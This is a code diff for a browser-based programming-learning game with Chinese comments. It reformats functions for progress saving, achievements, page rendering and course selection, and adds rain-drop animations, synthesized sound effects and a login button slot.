-                gameState.wrongAnswers = new Set(data.wrongAnswers || []);
-                gameState.maxStreak = data.maxStreak || 0;
-                gameState.totalAttempts = data.totalAttempts || 0;
-                gameState.correctAttempts = data.correctAttempts || 0;
-                gameState.studyTime = data.studyTime || 0;
-                gameState.lastStudyDate = data.lastStudyDate;
-                gameState.todayCompleted = data.todayCompleted || 0;
-                
-                // 检查是否新的一天，重置今日完成数
-                const today = new Date().toDateString();
-                if (gameState.lastStudyDate !== today) {
-                    gameState.todayCompleted = 0;
-                    gameState.lastStudyDate = today;
-                }
-                
-                // 加载选择的课程
-                gameState.selectedCourse = data.selectedCourse || null;
-                if (gameState.selectedCourse) {
-                    gameState.currentPage = 'home';
-                }
+        this.element.style.width = w + 'px';
+        this.element.style.height = h + 'px';
+        this.element.style.borderRadius = borderRadius;
+    }
+
+    // 吹散效果 - 分裂成小水珠
+    scatter() {
+        this.scattered = true;
+        const numParticles = Math.floor(Math.random() * 4) + 3;
+
+        for (let i = 0; i < numParticles; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'scatter-particle';
+            particle.style.left = this.x + 'px';
+            particle.style.top = this.y + 'px';
+
+            const size = Math.random() * 4 + 2;
+            particle.style.width = size + 'px';
+            particle.style.height = size + 'px';
+
+            // 随机飞散方向
+            const angle = (Math.random() - 0.5) * Math.PI;
+            const distance = Math.random() * 60 + 30;
+            const tx = Math.sin(angle) * distance;
+            const ty = Math.cos(angle) * distance * 0.5 - 20;
+
+            particle.style.setProperty('--tx', tx + 'px');
+            particle.style.setProperty('--ty', ty + 'px');
+
+            this.container.appendChild(particle);
+
+            setTimeout(() => particle.remove(), 600);
+        }
+
+        // 隐藏原水滴
+        this.element.style.opacity = '0';
+        this.element.style.transform = 'scale(0)';
+    }
+
+    update() {
+        if (this.scattered) {
+            // 已被吹散，等待重置
+            if (this.y > window.innerHeight + 50) {
+                this.reset();
             }
+            this.y += this.speed;
+            return;
         }
 
-        // 保存进度到localStorage
-        function saveProgress() {
-            const data = {
-                flippedCards: [...gameState.flippedCards],
-                completedChallenges: [...gameState.completedChallenges],
-                totalXP: gameState.totalXP,
-                unlockedAchievements: [...gameState.unlockedAchievements],
-                // 新增数据
-                wrongAnswers: [...gameState.wrongAnswers],
-                maxStreak: gameState.maxStreak,
-                totalAttempts: gameState.totalAttempts,
-                correctAttempts: gameState.correctAttempts,
-                studyTime: gameState.studyTime,
-                lastStudyDate: new Date().toDateString(),
-                todayCompleted: gameState.todayCompleted,
-                // 保存选择的课程
-                selectedCourse: gameState.selectedCourse
-            };
-            localStorage.setItem('codingGameProgress', JSON.stringify(data));
+        // 向下流动，带一点横向摆动
+        this.y += this.speed;
+        this.x += Math.sin(this.y * 0.015) * 0.2;
+
+        // 检查是否要被吹散（20%概率）
+        if (this.scatterChance < 0.2 && this.y > this.scatterY && !this.scattered) {
+            this.scatter();
+            return;
         }
 
-        // 检查成就
-        function checkAchievements() {
-            const cardsViewed = gameState.flippedCards.size;
-            const challengesDone = gameState.completedChallenges.size;
-            const xp = gameState.totalXP;
-            const streak = gameState.streak;
-            
-            const newAchievements = [];
-            
-            GAME_DATA.achievements.forEach(achievement => {
-                if (!gameState.unlockedAchievements.has(achievement.id) && 
-                    achievement.condition(cardsViewed, challengesDone, xp, streak)) {
-                    gameState.unlockedAchievements.add(achievement.id);
-                    newAchievements.push(achievement);
-                }
-            });
-            
-            if (newAchievements.length > 0) {
-                saveProgress();
-                showAchievementPopup(newAchievements[0]);
-            }
+        // 更新水滴位置
+        this.element.style.left = this.x + 'px';
+        this.element.style.top = this.y + 'px';
+
+        // 超出屏幕重置
+        if (this.y > window.innerHeight + 50) {
+            this.reset();
+        }
+    }
+
+    reset() {
+        this.x = Math.random() * window.innerWidth;
+        this.y = Math.random() * -200 - 50;
+        this.speed = Math.random() * 1.3 + 0.2;
+        this.size = Math.random() * 10 + 8;
+        this.scattered = false;
+        this.scatterChance = Math.random();
+        this.scatterY = Math.random() * window.innerHeight * 0.7 + window.innerHeight * 0.1;
+        this.element.style.opacity = '1';
+        this.element.style.transform = 'scale(1)';
+        this.setShape();
+    }
+
+    remove() {
+        this.element.remove();
+    }
+}
+
+// 小水珠类
+class TinyDrop {
+    constructor(container) {
+        this.container = container;
+        this.element = document.createElement('div');
+        this.element.className = 'tiny-drop';
+
+        const size = Math.random() * 4 + 2;
+        this.element.style.width = size + 'px';
+        this.element.style.height = size + 'px';
+        this.element.style.left = Math.random() * 100 + '%';
+        this.element.style.top = Math.random() * 100 + '%';
+        this.element.style.opacity = Math.random() * 0.6 + 0.2;
+
+        container.appendChild(this.element);
+    }
+
+    remove() {
+        this.element.remove();
+    }
+}
+
+// 滑动水滴类 - 在屏幕上缓慢滑落
+class SlidingDrop {
+    constructor(container) {
+        this.container = container;
+        this.x = Math.random() * window.innerWidth;
+        this.y = Math.random() * window.innerHeight * 0.3; // 从上部开始
+        this.size = Math.random() * 14 + 10;
+        this.speed = Math.random() * 0.3 + 0.1; // 非常慢
+        this.wobble = Math.random() * 0.5 + 0.2;
+
+        this.element = document.createElement('div');
+        this.element.className = 'water-drop sliding';
+        this.setShape();
+        container.appendChild(this.element);
+
+        // 水痕
+        this.trail = document.createElement('div');
+        this.trail.className = 'slide-trail';
+        this.trail.style.left = (this.x + this.size * 0.4) + 'px';
+        this.trail.style.top = this.y + 'px';
+        this.trail.style.width = '2px';
+        this.trail.style.height = '0px';
+        container.appendChild(this.trail);
+
+        this.startY = this.y;
+    }
+
+    setShape() {
+        const w = this.size;
+        const h = this.size * (1.3 + Math.random() * 0.4);
+        this.element.style.width = w + 'px';
+        this.element.style.height = h + 'px';
+        this.element.style.borderRadius = '45% 45% 50% 50% / 30% 30% 60% 60%';
+    }
+
+    update() {
+        this.y += this.speed;
+        this.x += Math.sin(this.y * 0.01) * this.wobble;
+
+        this.element.style.left = this.x + 'px';
+        this.element.style.top = this.y + 'px';
+
+        // 更新水痕
+        const trailHeight = this.y - this.startY;
+        this.trail.style.height = Math.min(trailHeight, 150) + 'px';
+        this.trail.style.opacity = Math.max(0, 0.3 - trailHeight / 500);
+
+        if (this.y > window.innerHeight + 50) {
+            this.reset();
+        }
+    }
+
+    reset() {
+        this.x = Math.random() * window.innerWidth;
+        this.y = Math.random() * -100 - 50;
+        this.startY = this.y;
+        this.speed = Math.random() * 0.3 + 0.1;
+        this.trail.style.left = (this.x + this.size * 0.4) + 'px';
+        this.trail.style.top = this.y + 'px';
+        this.trail.style.height = '0px';
+    }
+
+    remove() {
+        this.element.remove();
+        this.trail.remove();
+    }
+}
+
+let slidingDrops = [];
+
+function startRainEffect() {
+    const container = document.getElementById('fullscreen-rain');
+    if (!container) return;
+
+    container.classList.add('active');
+    container.innerHTML = '';
+    drops = [];
+    slidingDrops = [];
+
+    // 创建下落的水滴
+    for (let i = 0; i < 6; i++) {
+        setTimeout(() => {
+            const drop = new WaterDrop(container);
+            drop.y = Math.random() * window.innerHeight;
+            drops.push(drop);
+        }, i * 200);
+    }
+
+    // 创建滑动水滴（少量，缓慢滑落）
+    for (let i = 0; i < 3; i++) {
+        setTimeout(() => {
+            const slide = new SlidingDrop(container);
+            slidingDrops.push(slide);
+        }, i * 500);
+    }
+
+    // 创建静止小水珠
+    for (let i = 0; i < 12; i++) {
+        new TinyDrop(container);
+    }
+
+    // 动画循环
+    function animate() {
+        drops.forEach(drop => drop.update());
+        slidingDrops.forEach(drop => drop.update());
+        rainAnimationId = requestAnimationFrame(animate);
+    }
+    animate();
+}
+
+function stopRainEffect() {
+    const container = document.getElementById('fullscreen-rain');
+    if (container) {
+        container.classList.remove('active');
+    }
+
+    if (rainAnimationId) {
+        cancelAnimationFrame(rainAnimationId);
+        rainAnimationId = null;
+    }
+
+    drops.forEach(drop => drop.remove());
+    drops = [];
+    slidingDrops.forEach(drop => drop.remove());
+    slidingDrops = [];
+
+    setTimeout(() => {
+        if (container) container.innerHTML = '';
+    }, 500);
+}
+
+function setVolume(value) {
+    if (audioPlayer) audioPlayer.volume = value / 100;
+}
+
+function renderMusicPlayer() {
+    return `<div id="music-player" class="music-player"></div>`;
+}
+
+// 音效系统
+function playNote(frequency, duration, volume = 0.15, type = 'sine') {
+    initAudio();
+    if (!audioContext || !frequency) return;
+
+    const oscillator = audioContext.createOscillator();
+    const gainNode = audioContext.createGain();
+
+    oscillator.connect(gainNode);
+    gainNode.connect(audioContext.destination);
+
+    oscillator.frequency.value = frequency;
+    oscillator.type = type;
+
+    const now = audioContext.currentTime;
+    gainNode.gain.setValueAtTime(volume, now);
+    gainNode.gain.exponentialRampToValueAtTime(0.01, now + duration);
+
+    oscillator.start(now);
+    oscillator.stop(now + duration);
+}
+
+function playSuccessSound() {
+    setTimeout(() => playNote(NOTES.C5, 0.15, 0.2), 0);
+    setTimeout(() => playNote(NOTES.E5, 0.15, 0.2), 100);
+    setTimeout(() => playNote(NOTES.G5, 0.3, 0.2), 200);
+}
+
+function playErrorSound() {
+    playNote(200, 0.3, 0.15, 'square');
+}
+
+function playFlipSound() {
+    playNote(NOTES.G4, 0.1, 0.1);
+}
+
+function playClickSound() {
+    playNote(NOTES.C5, 0.05, 0.08);
+}
+
+// 格式化解释内容，让换行和格式更清晰
+function formatExplanation(text) {
+    if (!text) return '';
+    return text
+        // 先处理字面的\n字符串
+        .split('\\n\\n').join('<br><br>')
+        .split('\\n').join('<br>')
+        // 处理实际换行符
+        .split('\n\n').join('<br><br>')
+        .split('\n').join('<br>')
+        // emoji颜色
+        .replace(/📌/g, '<span class="text-yellow-400 font-bold">📌</span>')
+        .replace(/🔹/g, '<br><span class="text-blue-400">🔹</span>')
+        .replace(/💡/g, '<br><br><span class="text-yellow-300 font-medium">💡</span>')
+        .replace(/🎯/g, '<br><br><span class="text-green-400 font-medium">🎯</span>')
+        .replace(/📝/g, '<br><span class="text-purple-400">📝</span>')
+        .replace(/🔄/g, '<br><span class="text-cyan-400">🔄</span>')
+        .replace(/•/g, '<br>&nbsp;&nbsp;•');
+}
+
+// 从localStorage加载进度
+function loadProgress() {
+    const saved = localStorage.getItem('codingGameProgress');
+    if (saved) {
+        const data = JSON.parse(saved);
+        gameState.flippedCards = new Set(data.flippedCards || []);
+        gameState.completedChallenges = new Set(data.completedChallenges || []);
+        gameState.totalXP = data.totalXP || 0;
+        gameState.unlockedAchievements = new Set(data.unlockedAchievements || []);
+        // 新增数据
+        gameState.wrongAnswers = new Set(data.wrongAnswers || []);
+        gameState.maxStreak = data.maxStreak || 0;
+        gameState.totalAttempts = data.totalAttempts || 0;
+        gameState.correctAttempts = data.correctAttempts || 0;
+        gameState.studyTime = data.studyTime || 0;
+        gameState.lastStudyDate = data.lastStudyDate;
+        gameState.todayCompleted = data.todayCompleted || 0;
+
+        // 检查是否新的一天，重置今日完成数
+        const today = new Date().toDateString();
+        if (gameState.lastStudyDate !== today) {
+            gameState.todayCompleted = 0;
+            gameState.lastStudyDate = today;
         }
 
-        // 显示成就弹窗
-        function showAchievementPopup(achievement) {
-            const popup = document.createElement('div');
-            popup.className = 'fixed top-4 right-4 bg-yellow-500 text-black px-6 py-4 rounded-xl shadow-2xl bounce-in z-50';
-            popup.innerHTML = `
+        // 加载选择的课程
+        gameState.selectedCourse = data.selectedCourse || null;
+        if (gameState.selectedCourse) {
+            gameState.currentPage = 'home';
+        }
+    }
+}
+
+// 保存进度到localStorage
+function saveProgress() {
+    const data = {
+        flippedCards: [...gameState.flippedCards],
+        completedChallenges: [...gameState.completedChallenges],
+        totalXP: gameState.totalXP,
+        unlockedAchievements: [...gameState.unlockedAchievements],
+        // 新增数据
+        wrongAnswers: [...gameState.wrongAnswers],
+        maxStreak: gameState.maxStreak,
+        totalAttempts: gameState.totalAttempts,
+        correctAttempts: gameState.correctAttempts,
+        studyTime: gameState.studyTime,
+        lastStudyDate: new Date().toDateString(),
+        todayCompleted: gameState.todayCompleted,
+        // 保存选择的课程
+        selectedCourse: gameState.selectedCourse
+    };
+    localStorage.setItem('codingGameProgress', JSON.stringify(data));
+}
+
+// 检查成就
+function checkAchievements() {
+    const cardsViewed = gameState.flippedCards.size;
+    const challengesDone = gameState.completedChallenges.size;
+    const xp = gameState.totalXP;
+    const streak = gameState.streak;
+
+    const newAchievements = [];
+
+    GAME_DATA.achievements.forEach(achievement => {
+        if (!gameState.unlockedAchievements.has(achievement.id) &&
+            achievement.condition(cardsViewed, challengesDone, xp, streak)) {
+            gameState.unlockedAchievements.add(achievement.id);
+            newAchievements.push(achievement);
+        }
+    });
+
+    if (newAchievements.length > 0) {
+        saveProgress();
+        showAchievementPopup(newAchievements[0]);
+    }
+}
+
+// 显示成就弹窗
+function showAchievementPopup(achievement) {
+    const popup = document.createElement('div');
+    popup.className = 'fixed top-4 right-4 bg-yellow-500 text-black px-6 py-4 rounded-xl shadow-2xl bounce-in z-50';
+    popup.innerHTML = `
                 <div class="flex items-center gap-3">
                     <span class="text-3xl">${achievement.icon}</span>
                     <div>
@@ -4020,114 +4020,114 @@ check_sensitive_files(url)`,
                     </div>
                 </div>
             `;
-            document.body.appendChild(popup);
-            
-            setTimeout(() => popup.remove(), 3000);
-        }
+    document.body.appendChild(popup);
 
-        // ============== 渲染函数 ==============
-        function render() {
-            const app = document.getElementById('app');
-            
-            switch(gameState.currentPage) {
-                case 'courseSelect':
-                    app.innerHTML = renderCourseSelect();
-                    break;
-                case 'home':
-                    app.innerHTML = renderHome();
-                    break;
-                case 'cards':
-                    app.innerHTML = renderCards();
-                    break;
-                case 'cardDetail':
-                    app.innerHTML = renderCardDetail();
-                    break;
-                case 'challenges':
-                    app.innerHTML = renderChallenges();
-                    break;
-                case 'challengePlay':
-                    app.innerHTML = renderChallengePlay();
-                    // 加载Pyodide用于代码运行
-                    if (!document.getElementById('pyodide-script')) {
-                        const script = document.createElement('script');
-                        script.id = 'pyodide-script';
-                        script.src = 'https://cdn.jsdelivr.net/pyodide/v0.24.1/full/pyodide.js';
-                        document.head.appendChild(script);
-                    }
-                    break;
-                case 'achievements':
-                    app.innerHTML = renderAchievements();
-                    break;
-                case 'codeRunner':
-                    app.innerHTML = renderCodeRunner();
-                    break;
-                case 'securityTools':
-                    app.innerHTML = renderSecurityTools();
-                    break;
-                case 'reference':
-                    app.innerHTML = renderReference();
-                    break;
-                case 'jsRunner':
-                    app.innerHTML = renderJsRunner();
-                    break;
-                case 'colorTool':
-                    app.innerHTML = renderColorTool();
-                    break;
-                case 'promptLib':
-                    app.innerHTML = renderPromptLib();
-                    break;
-                case 'projects':
-                    app.innerHTML = renderProjects();
-                    break;
-                case 'projectDetail':
-                    app.innerHTML = renderProjectDetail();
-                    break;
-                case 'wrongBook':
-                    app.innerHTML = renderWrongBook();
-                    break;
-                case 'stats':
-                    app.innerHTML = renderStats();
-                    break;
-                case 'randomChallenge':
-                    app.innerHTML = renderRandomChallenge();
-                    break;
-            }
-            
-            bindEvents();
-            
-            // 切换视频背景
-            updateVideoBg();
-            
-            // 初始化3D Tilt效果
-            setTimeout(() => initTiltEffect(), 100);
-            
-            // 添加音乐播放器
-            if (!document.getElementById('music-player')) {
-                const playerDiv = document.createElement('div');
-                playerDiv.innerHTML = renderMusicPlayer();
-                document.body.appendChild(playerDiv.firstChild);
-            }
-            updatePlayerUI();
-        }
+    setTimeout(() => popup.remove(), 3000);
+}
 
-        // 3D课程选择页面
-        function renderCourseSelect() {
-            const courses = [
-                { id: 'python', icon: '🐍', title: 'Python', desc: '变量、循环、函数<br>GUI界面、爬虫', bg: 'linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%)' },
-                { id: 'security', icon: '🔒', title: '网络安全', desc: '渗透测试、漏洞利用<br>Web安全防御', bg: 'linear-gradient(135deg, #ef4444 0%, #991b1b 100%)' },
-                { id: 'c', icon: '⚙️', title: 'C 语言', desc: '指针、内存管理<br>数据结构基础', bg: 'linear-gradient(135deg, #6366f1 0%, #4338ca 100%)' },
-                { id: 'cpp', icon: '🔧', title: 'C++', desc: '面向对象、STL<br>模板与泛型编程', bg: 'linear-gradient(135deg, #8b5cf6 0%, #6d28d9 100%)' },
-                { id: 'java', icon: '☕', title: 'Java', desc: 'OOP、集合框架<br>多线程、IO流', bg: 'linear-gradient(135deg, #f97316 0%, #c2410c 100%)' },
-                { id: 'css', icon: '🎨', title: 'CSS', desc: '选择器、布局<br>动画、响应式', bg: 'linear-gradient(135deg, #ec4899 0%, #be185d 100%)' },
-                { id: 'javascript', icon: '✨', title: 'JavaScript', desc: 'DOM操作、事件<br>异步编程、ES6+', bg: 'linear-gradient(135deg, #eab308 0%, #a16207 100%)' },
-                { id: 'ai', icon: '🤖', title: 'AI 人工智能', desc: '机器学习、神经网络<br>Prompt工程', bg: 'linear-gradient(135deg, #14b8a6 0%, #0f766e 100%)' }
-            ];
-            
-            // 计算每个卡片的角度（8个卡片，每个45度）
-            const radius = 450; // 旋转半径
-            const cardHtml = courses.map((course, i) => {
-                const angle = (360 / courses.length) * i;
-                return `
+// ============== 渲染函数 ==============
+function render() {
+    const app = document.getElementById('app');
+
+    switch (gameState.currentPage) {
+        case 'courseSelect':
+            app.innerHTML = renderCourseSelect();
+            break;
+        case 'home':
+            app.innerHTML = renderHome();
+            break;
+        case 'cards':
+            app.innerHTML = renderCards();
+            break;
+        case 'cardDetail':
+            app.innerHTML = renderCardDetail();
+            break;
+        case 'challenges':
+            app.innerHTML = renderChallenges();
+            break;
+        case 'challengePlay':
+            app.innerHTML = renderChallengePlay();
+            // 加载Pyodide用于代码运行
+            if (!document.getElementById('pyodide-script')) {
+                const script = document.createElement('script');
+                script.id = 'pyodide-script';
+                script.src = 'https://cdn.jsdelivr.net/pyodide/v0.24.1/full/pyodide.js';
+                document.head.appendChild(script);
+            }
+            break;
+        case 'achievements':
+            app.innerHTML = renderAchievements();
+            break;
+        case 'codeRunner':
+            app.innerHTML = renderCodeRunner();
+            break;
+        case 'securityTools':
+            app.innerHTML = renderSecurityTools();
+            break;
+        case 'reference':
+            app.innerHTML = renderReference();
+            break;
+        case 'jsRunner':
+            app.innerHTML = renderJsRunner();
+            break;
+        case 'colorTool':
+            app.innerHTML = renderColorTool();
+            break;
+        case 'promptLib':
+            app.innerHTML = renderPromptLib();
+            break;
+        case 'projects':
+            app.innerHTML = renderProjects();
+            break;
+        case 'projectDetail':
+            app.innerHTML = renderProjectDetail();
+            break;
+        case 'wrongBook':
+            app.innerHTML = renderWrongBook();
+            break;
+        case 'stats':
+            app.innerHTML = renderStats();
+            break;
+        case 'randomChallenge':
+            app.innerHTML = renderRandomChallenge();
+            break;
+    }
+
+    bindEvents();
+
+    // 切换视频背景
+    updateVideoBg();
+
+    // 初始化3D Tilt效果
+    setTimeout(() => initTiltEffect(), 100);
+
+    // 添加音乐播放器
+    if (!document.getElementById('music-player')) {
+        const playerDiv = document.createElement('div');
+        playerDiv.innerHTML = renderMusicPlayer();
+        document.body.appendChild(playerDiv.firstChild);
+    }
+    updatePlayerUI();
+}
+
+// 3D课程选择页面
+function renderCourseSelect() {
+    const courses = [
+        { id: 'python', icon: '🐍', title: 'Python', desc: '变量、循环、函数<br>GUI界面、爬虫', bg: 'linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%)' },
+        { id: 'security', icon: '🔒', title: '网络安全', desc: '渗透测试、漏洞利用<br>Web安全防御', bg: 'linear-gradient(135deg, #ef4444 0%, #991b1b 100%)' },
+        { id: 'c', icon: '⚙️', title: 'C 语言', desc: '指针、内存管理<br>数据结构基础', bg: 'linear-gradient(135deg, #6366f1 0%, #4338ca 100%)' },
+        { id: 'cpp', icon: '🔧', title: 'C++', desc: '面向对象、STL<br>模板与泛型编程', bg: 'linear-gradient(135deg, #8b5cf6 0%, #6d28d9 100%)' },
+        { id: 'java', icon: '☕', title: 'Java', desc: 'OOP、集合框架<br>多线程、IO流', bg: 'linear-gradient(135deg, #f97316 0%, #c2410c 100%)' },
+        { id: 'css', icon: '🎨', title: 'CSS', desc: '选择器、布局<br>动画、响应式', bg: 'linear-gradient(135deg, #ec4899 0%, #be185d 100%)' },
+        { id: 'javascript', icon: '✨', title: 'JavaScript', desc: 'DOM操作、事件<br>异步编程、ES6+', bg: 'linear-gradient(135deg, #eab308 0%, #a16207 100%)' },
+        { id: 'ai', icon: '🤖', title: 'AI 人工智能', desc: '机器学习、神经网络<br>Prompt工程', bg: 'linear-gradient(135deg, #14b8a6 0%, #0f766e 100%)' }
+    ];
+
+    // 计算每个卡片的角度（8个卡片，每个45度）
+    const radius = 450; // 旋转半径
+    const cardHtml = courses.map((course, i) => {
+        const angle = (360 / courses.length) * i;
+        return `
                     <div class="carousel-card" 
                          style="transform: rotateY(${angle}deg) translateZ(${radius}px);"
                          onclick="selectCourse('${course.id}')">
@@ -4139,9 +4139,9 @@ check_sensitive_files(url)`,
                         </div>
                     </div>
                 `;
-            }).join('');
-            
-            return `
+    }).join('');
+
+    return `
                 <div class="min-h-screen flex flex-col items-center justify-center relative overflow-hidden">
                     <!-- 3D背景效果 -->
                     <div class="select-bg-effect">
@@ -4152,6 +4152,10 @@ check_sensitive_files(url)`,
                     
                     <!-- 标题 -->
                     <div class="text-center mb-8 relative z-10">
+                        <!-- 用户登录按钮 -->
+                        <div class="absolute top-0 right-8">
+                            ${typeof renderUserButton === 'function' ? renderUserButton() : ''}
+                        </div>
                         <h1 class="text-5xl font-bold text-white mb-4" style="text-shadow: 0 4px 20px rgba(0,0,0,0.5);">
                             🎓 选择你的学习路径
                         </h1>
@@ -4171,99 +4175,99 @@ check_sensitive_files(url)`,
                     </div>
                 </div>
             `;
-        }
-        
-        // 旋转木马控制
-        let carouselAngle = 0;
-        function rotateCarousel(direction) {
-            const carousel = document.getElementById('courseCarousel');
-            if (carousel) {
-                carouselAngle += direction * 45; // 每次旋转45度（360/8）
-                carousel.style.animation = 'none';
-                carousel.style.transform = 'rotateY(' + carouselAngle + 'deg)';
-            }
-        }
-        
-        // 选择课程
-        function selectCourse(course) {
-            gameState.selectedCourse = course;
-            gameState.currentPage = 'home';
-            saveProgress();
-            render();
-            
-            // 显示欢迎提示
-            const courseNames = {
-                python: 'Python 编程', security: '网络安全', c: 'C 语言',
-                cpp: 'C++', java: 'Java', css: 'CSS', javascript: 'JavaScript',
-                ai: 'AI 人工智能'
-            };
-            showPopup(`🎉 欢迎进入${courseNames[course] || course}学习！`, 'success');
-        }
+}
 
-        // 课程配置信息
-        const COURSE_CONFIG = {
-            python: { icon: '🐍', name: 'Python 编程', color: 'blue', source: '📂 知识来源：地标管理系统 · 爬虫项目' },
-            security: { icon: '🔒', name: '网络安全', color: 'red', source: '📂 知识来源：渗透测试学习' },
-            c: { icon: '⚙️', name: 'C 语言', color: 'indigo', source: '📂 知识来源：系统编程基础' },
-            cpp: { icon: '🔧', name: 'C++', color: 'purple', source: '📂 知识来源：面向对象编程' },
-            java: { icon: '☕', name: 'Java', color: 'orange', source: '📂 知识来源：企业级开发' },
-            css: { icon: '🎨', name: 'CSS', color: 'pink', source: '📂 知识来源：前端样式设计' },
-            javascript: { icon: '✨', name: 'JavaScript', color: 'yellow', source: '📂 知识来源：前端交互开发' },
-            ai: { icon: '🤖', name: 'AI 人工智能', color: 'teal', source: '📂 知识来源：机器学习与深度学习' }
-        };
-        
-        // 获取课程相关的挑战分类
-        function getCourseCategories(course) {
-            const courseCategories = {
-                python: ['基础语法', 'GUI界面', '数据处理', '网络爬虫', '正则表达式', '字符串', '列表', '字典', '控制流', '函数', '文件操作', '类型转换', '集合元组', '内置函数', '异常处理', '面向对象', '高级技巧'],
-                security: ['HTTP基础', 'Web漏洞', '系统安全'],
-                c: ['C基础', 'C指针', 'C控制流'],
-                cpp: ['C++基础', 'C++OOP', 'C++高级'],
-                java: ['Java基础', 'JavaOOP', 'Java高级'],
-                css: ['CSS基础', 'CSS布局'],
-                javascript: ['JS基础', 'JS进阶'],
-                ai: ['AI基础', '神经网络']
-            };
-            return courseCategories[course] || courseCategories.python;
+// 旋转木马控制
+let carouselAngle = 0;
+function rotateCarousel(direction) {
+    const carousel = document.getElementById('courseCarousel');
+    if (carousel) {
+        carouselAngle += direction * 45; // 每次旋转45度（360/8）
+        carousel.style.animation = 'none';
+        carousel.style.transform = 'rotateY(' + carouselAngle + 'deg)';
+    }
+}
+
+// 选择课程
+function selectCourse(course) {
+    gameState.selectedCourse = course;
+    gameState.currentPage = 'home';
+    saveProgress();
+    render();
+
+    // 显示欢迎提示
+    const courseNames = {
+        python: 'Python 编程', security: '网络安全', c: 'C 语言',
+        cpp: 'C++', java: 'Java', css: 'CSS', javascript: 'JavaScript',
+        ai: 'AI 人工智能'
+    };
+    showPopup(`🎉 欢迎进入${courseNames[course] || course}学习！`, 'success');
+}
+
+// 课程配置信息
+const COURSE_CONFIG = {
+    python: { icon: '🐍', name: 'Python 编程', color: 'blue', source: '📂 知识来源：地标管理系统 · 爬虫项目' },
+    security: { icon: '🔒', name: '网络安全', color: 'red', source: '📂 知识来源：渗透测试学习' },
+    c: { icon: '⚙️', name: 'C 语言', color: 'indigo', source: '📂 知识来源：系统编程基础' },
+    cpp: { icon: '🔧', name: 'C++', color: 'purple', source: '📂 知识来源：面向对象编程' },
+    java: { icon: '☕', name: 'Java', color: 'orange', source: '📂 知识来源：企业级开发' },
+    css: { icon: '🎨', name: 'CSS', color: 'pink', source: '📂 知识来源：前端样式设计' },
+    javascript: { icon: '✨', name: 'JavaScript', color: 'yellow', source: '📂 知识来源：前端交互开发' },
+    ai: { icon: '🤖', name: 'AI 人工智能', color: 'teal', source: '📂 知识来源：机器学习与深度学习' }
+};
+
+// 获取课程相关的挑战分类
+function getCourseCategories(course) {
+    const courseCategories = {
+        python: ['基础语法', 'GUI界面', '数据处理', '网络爬虫', '正则表达式', '字符串', '列表', '字典', '控制流', '函数', '文件操作', '类型转换', '集合元组', '内置函数', '异常处理', '面向对象', '高级技巧'],
+        security: ['HTTP基础', 'Web漏洞', '系统安全'],
+        c: ['C基础', 'C指针', 'C控制流'],
+        cpp: ['C++基础', 'C++OOP', 'C++高级'],
+        java: ['Java基础', 'JavaOOP', 'Java高级'],
+        css: ['CSS基础', 'CSS布局'],
+        javascript: ['JS基础', 'JS进阶'],
+        ai: ['AI基础', '神经网络']
+    };
+    return courseCategories[course] || courseCategories.python;
+}
+
+// 获取工具卡片
+function getToolCard(course) {
+    const tools = {
+        python: {
+            icon: '💻', title: '代码运行器', desc: '在浏览器中直接运行Python代码',
+            action: "navigateTo('codeRunner')",
+            tags: [{ text: '🐍 Python', color: 'blue' }, { text: '⚡ 实时运行', color: 'cyan' }]
+        },
+        security: {
+            icon: '🛠️', title: '安全工具箱', desc: '常用安全工具与命令速查手册',
+            action: "navigateTo('securityTools')",
+            tags: [{ text: '🔧 Nmap', color: 'red' }, { text: '🕸️ Burp', color: 'orange' }]
+        },
+        javascript: {
+            icon: '💻', title: 'JS运行器', desc: '在浏览器中直接运行JavaScript代码',
+            action: "navigateTo('jsRunner')",
+            tags: [{ text: '✨ JavaScript', color: 'yellow' }, { text: '⚡ 实时运行', color: 'green' }]
+        },
+        css: {
+            icon: '🎨', title: '颜色工具', desc: '颜色选择器与渐变生成器',
+            action: "navigateTo('colorTool')",
+            tags: [{ text: '🌈 调色板', color: 'pink' }, { text: '✨ 渐变', color: 'purple' }]
+        },
+        ai: {
+            icon: '💬', title: 'Prompt模板', desc: '常用AI提示词模板与技巧',
+            action: "navigateTo('promptLib')",
+            tags: [{ text: '🤖 ChatGPT', color: 'teal' }, { text: '📝 模板', color: 'indigo' }]
         }
-        
-        // 获取工具卡片
-        function getToolCard(course) {
-            const tools = {
-                python: {
-                    icon: '💻', title: '代码运行器', desc: '在浏览器中直接运行Python代码',
-                    action: "navigateTo('codeRunner')",
-                    tags: [{ text: '🐍 Python', color: 'blue' }, { text: '⚡ 实时运行', color: 'cyan' }]
-                },
-                security: {
-                    icon: '🛠️', title: '安全工具箱', desc: '常用安全工具与命令速查手册',
-                    action: "navigateTo('securityTools')",
-                    tags: [{ text: '🔧 Nmap', color: 'red' }, { text: '🕸️ Burp', color: 'orange' }]
-                },
-                javascript: {
-                    icon: '💻', title: 'JS运行器', desc: '在浏览器中直接运行JavaScript代码',
-                    action: "navigateTo('jsRunner')",
-                    tags: [{ text: '✨ JavaScript', color: 'yellow' }, { text: '⚡ 实时运行', color: 'green' }]
-                },
-                css: {
-                    icon: '🎨', title: '颜色工具', desc: '颜色选择器与渐变生成器',
-                    action: "navigateTo('colorTool')",
-                    tags: [{ text: '🌈 调色板', color: 'pink' }, { text: '✨ 渐变', color: 'purple' }]
-                },
-                ai: {
-                    icon: '💬', title: 'Prompt模板', desc: '常用AI提示词模板与技巧',
-                    action: "navigateTo('promptLib')",
-                    tags: [{ text: '🤖 ChatGPT', color: 'teal' }, { text: '📝 模板', color: 'indigo' }]
-                }
-            };
-            
-            const tool = tools[course] || {
-                icon: '📚', title: '速查手册', desc: '语法要点与常用代码速查',
-                action: "navigateTo('reference')",
-                tags: [{ text: '📖 语法', color: 'indigo' }, { text: '🔖 速查', color: 'teal' }]
-            };
-            
-            return `
+    };
+
+    const tool = tools[course] || {
+        icon: '📚', title: '速查手册', desc: '语法要点与常用代码速查',
+        action: "navigateTo('reference')",
+        tags: [{ text: '📖 语法', color: 'indigo' }, { text: '🔖 速查', color: 'teal' }]
+    };
+
+    return `
                 <div class="glass tilt-card rounded-2xl p-8 cursor-pointer relative overflow-hidden" onclick="${tool.action}">
                     <div class="tilt-glow"></div>
                     <div class="tilt-content">
@@ -4276,74 +4280,74 @@ check_sensitive_files(url)`,
                     </div>
                 </div>
             `;
-        }
-        
-        // 获取项目标签
-        function getProjectTags(course) {
-            const tags = {
-                python: ['🔢 计算器', '🎮 小游戏', '📊 数据分析'],
